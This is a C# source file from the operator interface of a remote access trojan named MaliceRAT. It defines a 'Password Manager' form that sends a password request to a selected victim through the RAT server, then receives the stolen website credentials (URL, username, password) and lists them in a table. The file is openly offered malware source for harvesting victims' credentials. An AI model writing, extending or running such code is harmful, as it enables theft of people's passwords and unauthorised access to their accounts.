using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Web.Script.Serialization;
using MaliceRAT.RatServer;

namespace MaliceRAT.RatUI
{
    public partial class PasswordManagerForm : Form
    {
        public class CredentialModel
        {
            public string Url { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
        }

        #region Variables
        private readonly int victimId;
        private readonly Server server;
        #endregion

        #region Constructor
        public PasswordManagerForm(int victimId, Server server)
        {
            InitializeComponent();
            this.victimId = victimId;
            this.server = server;

            server.GetVictimById(victimId).Send(new { type = "request_passswords" });
            server.MessageReceived += Server_MessageReceived;

            titleLabel.Text = $"Password Manager [{server.GetVictimById(victimId).User}]";
        }

        private void Server_MessageReceived(Victim victim, dynamic message)
        {
            if (victim.Id == victimId)
            {
                if (message["type"] == "passwords")
                {
                    var passwords = new JavaScriptSerializer().Deserialize<List<CredentialModel>>(message["data"].ToString());
                    Console.WriteLine(passwords.Count);
                    gunaPasswordsTable.Invoke((MethodInvoker)delegate {
                        gunaPasswordsTable.Rows.Clear();
                        foreach (var password in passwords)
                        {
                            gunaPasswordsTable.Rows.Add(password.Url, password.Username, password.Password);
                        }
                    });
                }
            }
        }
        #endregion
    }
}